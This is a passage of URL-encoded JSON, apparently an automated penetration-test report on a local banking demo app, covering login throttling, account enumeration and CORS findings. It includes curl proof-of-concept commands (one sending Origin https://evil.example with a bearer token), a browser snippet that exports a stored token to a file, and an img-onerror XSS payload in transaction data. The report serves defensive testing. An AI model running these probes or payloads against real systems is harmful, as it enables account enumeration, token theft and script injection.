0equivalent%20protection%20in%20the%20document.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20http%3A%2F%2Flocalhost%3A8081%2Fbanking%2F%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Customer%20login%20permits%20repeated%20password%20attempts%20without%20throttling%22%2C%22description%22%3A%22The%20customer%20login%20endpoint%20accepted%20six%20consecutive%20failed%20password%20attempts%20for%20a%20known-valid%20account%20without%20a%20rate-limit%20response%2C%20added%20delay%2C%20CAPTCHA%20challenge%2C%20or%20temporary%20account%20lockout.%22%2C%22impact%22%3A%22An%20attacker%20could%20automate%20password%20guessing%20or%20credential-stuffing%20attempts%20against%20customer%20accounts%20without%20an%20observed%20application-level%20control%20slowing%20or%20stopping%20repeated%20attempts.%22%2C%22likelihood%22%3A%22The%20endpoint%20is%20publicly%20accessible.%20During%20the%20authorized%20six-attempt%20test%2C%20every%20request%20received%20the%20same%20response%2C%20and%20the%20final%20attempt%20completed%20slightly%20faster%20than%20the%20first%2C%20indicating%20no%20progressive%20delay%20within%20the%20tested%20sequence.%22%2C%22recommendation%22%3A%22Apply%20per-account%20and%20per-source%20rate%20limits%2C%20progressive%20delays%2C%20temporary%20lockouts%2C%20and%20monitoring%20for%20repeated%20authentication%20failures.%20Use%20generic%20authentication%20errors%20and%20design%20the%20controls%20to%20resist%20distributed%20attacks%20without%20allowing%20attackers%20to%20lock%20out%20a%20victim's%20account%20indefinitely.%22%2C%22cvss_score%22%3A3.7%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AL%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%22%2C%22evidence%22%3A%22Exactly%20six%20consecutive%20failed%20login%20requests%20were%20sent%20for%20the%20known-valid%20account%20amelia.chen%40example.com.%20All%20six%20returned%20HTTP%20401%20with%20code%20WRONG_PASSWORD%20and%20message%20Incorrect%20password.%20Attempt%201%20completed%20in%2078%20ms%20and%20attempt%206%20in%2074%20ms.%20No%20HTTP%20429%20response%2C%20added%20delay%2C%20CAPTCHA%20challenge%2C%20or%20account%20lockout%20was%20observed.%22%2C%22request_evidence%22%3A%22POST%20%2Fapi%2Fauth%2Flogin%20with%20%7B%5C%22email%5C%22%3A%5C%22amelia.chen%40example.com%5C%22%2C%5C%22password%5C%22%3A%5C%22wrong-aespa-N%5C%22%7D%2C%20N%3D1%20through%206%2C%20each%20marked%20repeat_limit%3D6.%22%2C%22response_evidence%22%3A%22Attempt%201%3A%20HTTP%20401%20in%2078ms%2C%20%7B%5C%22code%5C%22%3A%5C%22WRONG_PASSWORD%5C%22%2C%5C%22message%5C%22%3A%5C%22Incorrect%20password.%5C%22%7D.%20Attempt%206%3A%20HTTP%20401%20in%2074ms%20with%20the%20identical%20body.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22I%20repeated%20the%20check%20with%20a%20fresh%20bounded%20sequence%20of%20six%20anonymous%20POST%20requests%20for%20the%20known-valid%20account%2C%20using%20an%20intentionally%20wrong%20password.%20Every%20request%20returned%20401%20WRONG_PASSWORD%20in%2070-82%20ms%2C%20with%20no%20429%2C%20Retry-After%20header%2C%20increasing%20delay%2C%20CAPTCHA%20response%2C%20or%20lockout%20response%3B%20this%20also%20followed%20the%20scanner's%20original%20six%20failures%2C%20so%20a%20later%20threshold%20did%20not%20provide%20an%20innocent%20explanation.%20No%20single%20request%20can%20prove%20a%20repetition-dependent%20weakness%2C%20so%20a%20single-request%20PoC%20is%20omitted.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Login%20error%20responses%20allow%20customer%20account%20enumeration%22%2C%22description%22%3A%22The%20login%20endpoint%20at%20%2Fapi%2Fauth%2Flogin%20returns%20different%20error%20codes%20and%20messages%20depending%20on%20whether%20the%20submitted%20email%20address%20belongs%20to%20an%20existing%20customer%20account.%20The%20observed%20responses%20also%20had%20different%20processing%20times.%22%2C%22impact%22%3A%22An%20unauthenticated%20attacker%20can%20identify%20registered%20customer%20email%20addresses.%20Confirmed%20addresses%20could%20support%20password%20guessing%2C%20credential%20stuffing%2C%20or%20targeted%20phishing.%22%2C%22likelihood%22%3A%22The%20response%20difference%20was%20deterministic%20and%20available%20without%20authentication.%20A%20known%20email%20produced%20WRONG_PASSWORD%2C%20while%20an%20unknown%20email%20produced%20USER_NOT_FOUND.%20The%20single%20observed%20requests%20completed%20in%2078%20ms%20and%2010%20ms%20respectively%2C%20although%20repeated%20measurements%20would%20be%20needed%20to%20establish%20timing%20as%20a%20reliable%20signal.%22%2C%22recommendation%22%3A%22Return%20the%20same%20HTTP%20status%2C%20generic%20response%20body%2C%20and%20error%20code%20for%20unknown%20accounts%20and%20incorrect%20passwords.%20Keep%20processing%20times%20similar%20for%20both%20cases.%20Apply%20the%20same%20rate%20limits%20to%20both%20outcomes%2C%20and%20monitor%20repeated%20login%20attempts%20for%20account-enumeration%20patterns.%22%2C%22cvss_score%22%3A3.7%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%22%2C%22evidence%22%3A%22Using%20the%20same%20invalid%20password%20structure%2C%20a%20request%20for%20known-valid%20amelia.chen%40example.com%20returned%20HTTP%20401%20in%2078%20ms%20with%20%7B%5C%22code%5C%22%3A%5C%22WRONG_PASSWORD%5C%22%2C%5C%22message%5C%22%3A%5C%22Incorrect%20password.%5C%22%7D.%20A%20request%20for%20aespa-unknown-20260908%40example.com%20returned%20HTTP%20401%20in%2010%20ms%20with%20%7B%5C%22code%5C%22%3A%5C%22USER_NOT_FOUND%5C%22%2C%5C%22message%5C%22%3A%5C%22No%20account%20found%20with%20this%20email%20address.%5C%22%7D.%22%2C%22request_evidence%22%3A%22POST%20%2Fapi%2Fauth%2Flogin%20with%20the%20same%20invalid%20password%20structure%2C%20once%20using%20a%20known-valid%20email%20and%20once%20using%20an%20unknown%20email.%22%2C%22response_evidence%22%3A%22Valid%20email%3A%20%7B%5C%22code%5C%22%3A%5C%22WRONG_PASSWORD%5C%22%2C%5C%22message%5C%22%3A%5C%22Incorrect%20password.%5C%22%7D.%20Unknown%20email%3A%20%7B%5C%22code%5C%22%3A%5C%22USER_NOT_FOUND%5C%22%2C%5C%22message%5C%22%3A%5C%22No%20account%20found%20with%20this%20email%20address.%5C%22%7D.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22I%20repeated%20the%20two%20anonymous%2C%20cookie-free%20login%20requests%20with%20the%20same%20invalid%20password.%20The%20known%20customer%20email%20returned%20401%20with%20WRONG_PASSWORD%20in%2081%20ms%2C%20while%20the%20unknown%20email%20returned%20401%20with%20USER_NOT_FOUND%20in%2012%20ms.%20The%20distinct%20codes%2C%20messages%2C%20content%20lengths%2C%20and%20repeatable%20timing%20direction%20directly%20reveal%20whether%20an%20email%20is%20registered%2C%20and%20I%20found%20no%20benign%20response%20normalization%20that%20would%20disprove%20the%20finding.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-X%20POST%20-H%20'Content-Type%3A%20application%2Fjson'%20-H%20'Content-Type%3A%20application%2Fjson'%20--data-raw%20'%7B%5C%22email%5C%22%3A%5C%22amelia.chen%40example.com%5C%22%2C%5C%22password%5C%22%3A%5C%22AespaInvalid!20260908%5C%22%7D'%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Profile%20API%20reflects%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20API%20reflects%20an%20untrusted%20Origin%20value%20and%20enables%20credentialed%20cross-origin%20requests%2C%20including%20on%20an%20admin%20endpoint%20returning%20customer%20data.%22%2C%22impact%22%3A%22If%20authentication%20credentials%20are%20available%20to%20the%20browser%20for%20cross-origin%20requests%2C%20a%20malicious%20site%20could%20read%20protected%20API%20responses.%20The%20observed%20bearer-token%20authentication%20limits%20the%20demonstrated%20impact.%22%2C%22likelihood%22%3A%22The%20origin%20reflection%20is%20confirmed%2C%20but%20no%20browser-based%20proof%20showed%20that%20an%20attacker-controlled%20origin%20can%20obtain%20or%20automatically%20send%20the%20required%20authorization%20token.%22%2C%22recommendation%22%3A%22Allow%20only%20explicitly%20trusted%20origins%2C%20do%20not%20dynamically%20reflect%20arbitrary%20Origin%20values%2C%20restrict%20allowed%20headers%20and%20methods%2C%20and%20enable%20credentials%20only%20where%20required.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D15%22%2C%22evidence%22%3A%22A%20request%20with%20Origin%3A%20https%3A%2F%2Fevil.example%20returned%20status%20200%20with%20admin%20customer%20data%20and%20headers%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%20and%20Access-Control-Allow-Credentials%3A%20true.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D15%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20401%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A13%3A40%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2076%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22UNAUTHORIZED%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20token.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D15%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20401%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A13%3A40%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2076%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22UNAUTHORIZED%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20token.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20initial%20anonymous%20request%20was%20only%20a%20401%2C%20so%20I%20retested%20with%20the%20listed%20admin%20session.%20The%20endpoint%20returned%20real%20customer%20records%20while%20reflecting%20https%3A%2F%2Fevil.example%20in%20Access-Control-Allow-Origin%20and%20setting%20Access-Control-Allow-Credentials%3A%20true.%20The%20OPTIONS%20preflight%20also%20returned%20200%20for%20a%20GET%20requesting%20the%20Authorization%20header%2C%20so%20the%20headers%20are%20not%20limited%20to%20the%20unauthorized%20response%20or%20stripped%20by%20a%20proxy.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-H%20'Origin%3A%20https%3A%2F%2Fevil.example'%20'http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D15'%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20admin%20user%20and%20copy%20the%20bearer%20token%20from%20the%20Authorization%20header%20in%20the%20browser%20DevTools%20Network%20request%2C%20then%20replay%20the%20request%20with%20Origin%3A%20https%3A%2F%2Fevil.example.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Profile%20API%20reflects%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20API%20reflects%20an%20untrusted%20Origin%20value%20in%20Access-Control-Allow-Origin%20while%20also%20returning%20Access-Control-Allow-Credentials%3A%20true.%20The%20behavior%20applies%20to%20an%20endpoint%20returning%20transaction%20details.%22%2C%22impact%22%3A%22If%20authentication%20credentials%20are%20automatically%20available%20to%20a%20hostile%20origin%2C%20that%20origin%20may%20be%20able%20to%20read%20sensitive%20API%20responses%20in%20a%20victim's%20browser.%22%2C%22likelihood%22%3A%22The%20arbitrary-origin%20behavior%20is%20confirmed%2C%20but%20the%20probe%20did%20not%20demonstrate%20a%20browser%20sending%20usable%20victim%20credentials%20automatically.%20The%20tested%20request%20used%20an%20Authorization%20header%20and%20no%20cookies.%22%2C%22recommendation%22%3A%22Allow%20only%20explicitly%20trusted%20origins%2C%20reject%20null%20and%20unknown%20origins%2C%20and%20enable%20credentialed%20CORS%20only%20on%20endpoints%20that%20require%20it.%20Add%20browser-based%20tests%20for%20authenticated%20cross-origin%20requests.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D1%26page%3D1%26per_page%3D15%22%2C%22evidence%22%3A%22A%20request%20with%20Origin%3A%20https%3A%2F%2Fevil.example%20received%20HTTP%20200%20containing%20transaction%20data%2C%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%2C%20and%20Access-Control-Allow-Credentials%3A%20true.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D1%26page%3D1%26per_page%3D15%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A15%3A51%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%203725%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22transactions%5C%22%3A%5B%7B%5C%22id%5C%22%3A43%2C%5C%22from_account_id%5C%22%3A100%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22to_account_id%5C%22%3A1%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22Payment%20to%20062-001%2010000001%20(A07%20validator%20near-no-op)%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22manual%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3A%5C%22REC-BOE-20260908-DC15DD18%5C%22%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-09-08%2012%3A55%3A01%5C%22%2C%5C%22type%5C%22%3A%5C%22credit%5C%22%7D%2C%7B%5C%22id%5C%22%3A42%2C%5C%22from_account_id%5C%22%3A100%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22to_account_id%5C%22%3A1%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22Payment%20to%20062-001%2010000001%20(AESPA%20machine-token%20test)%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22manual%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3A%5C%22REC-BOE-20260908-825C78E6%5C%22%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-09-08%2012%3A51%3A15%5C%22%2C%5C%22type%5C%22%3A%5C%22credit%5C%22%7D%2C%7B%5C%22id%5C%22%3A39%2C%5C%22from_account_id%5C%22%3A6%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22to_account_id%5C%22%3A1%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22AESPA%20ownership%20test%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22manual%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-09-08%2012%3A45%3A56%5C%22%2C%5C%22type%5C%22%3A%5C%22credit%5C%22%7D%2C%7B%5C%22id%5C%22%3A38%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22000-000%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2230000001%5C%22%2C%5C%22to_account_id%5C%22%3Anull%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22validation%20probe%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22manual%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-09-08%2012%3A39%3A27%5C%22%2C%5C%22type%5C%22%3A%5C%22debit%5C%22%7D%2C%7B%5C%22id%5C%22%3A37%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22000-000%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2230000001%5C%22%2C%5C%22to_account_id%5C%22%3Anull%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22validation%20probe%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22manual%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-09-08%2012%3A38%3A40%5C%22%2C%5C%22type%5C%22%3A%5C%22debit%5C%22%7D%2C%7B%5C%22id%5C%22%3A36%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2230000001%5C%22%2C%5C%22to_account_id%5C%22%3A6%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22%3Cimg%20src%3Dx%20onerror%3D%5C%5C%5C%22document.body.dataset.xss009%3D'1'%5C%5C%5C%22%3E%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22manual%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-09-08%2012%3A34%3A17%5C%22%2C%5C%22type%5C%22%3A%5C%22debit%5C%22%7D%2C%7B%5C%22id%5C%22%3A3%2C%5C%22from_account_id%5C%22%3A2%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22to_account_id%5C%22%3A1%2C%5C%22amount%5C%22%3A%5C%22200.00%5C%22%2C%5C%22description%5C%22%3A%5C%22Weekend%20spending%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22own%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-02-01%2010%3A00%3A00%5C%22%2C%5C%22type%5C%22%3A%5C%22credit%5C%22%7D%2C%7B%5C%22id%5C%22%3A2%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22033-042%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2256781234%5C%22%2C%5C%22to_account_id%5C%22%3Anull%2C%5C%22amount%5C%22%3A%5C%22150.00%5C%22%2C%5C%22description%5C%22%3A%5C%22Birthday%20gift%20Mum%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22address_book%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Atrue%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-01-20%2014%3A30%3A00%5C%22%2C%5C%22type%5C%22%3A%5C%22debit%5C%22%7D%2C%7B%5C%22id%5C%22%3A1%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000002%5C%22%2C%5C%22to_account_id%5C%22%3A2%2C%5C%22amount%5C%22%3A%5C%22500.00%5C%22%2C%5C%22description%5C%22%3A%5C%22Monthly%20savings%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22own%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-01-05%2009%3A12%3A00%5C%22%2C%5C%22type%5C%22%3A%5C%22debit%5C%22%7D%5D%2C%5C%22pagination%5C%22%3A%7B%5C%22current_page%5C%22%3A1%2C%5C%22per_page%5C%22%3A15%2C%5C%22total%5C%22%3A9%2C%5C%22total_pages%5C%22%3A1%7D%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D1%26page%3D1%26per_page%3D15%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A15%3A51%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%203725%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22transactions%5C%22%3A%5B%7B%5C%22id%5C%22%3A43%2C%5C%22from_account_id%5C%22%3A100%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22to_account_id%5C%22%3A1%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22Payment%20to%20062-001%2010000001%20(A07%20validator%20near-no-op)%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22manual%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3A%5C%22REC-BOE-20260908-DC15DD18%5C%22%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-09-08%2012%3A55%3A01%5C%22%2C%5C%22type%5C%22%3A%5C%22credit%5C%22%7D%2C%7B%5C%22id%5C%22%3A42%2C%5C%22from_account_id%5C%22%3A100%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22to_account_id%5C%22%3A1%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22Payment%20to%20062-001%2010000001%20(A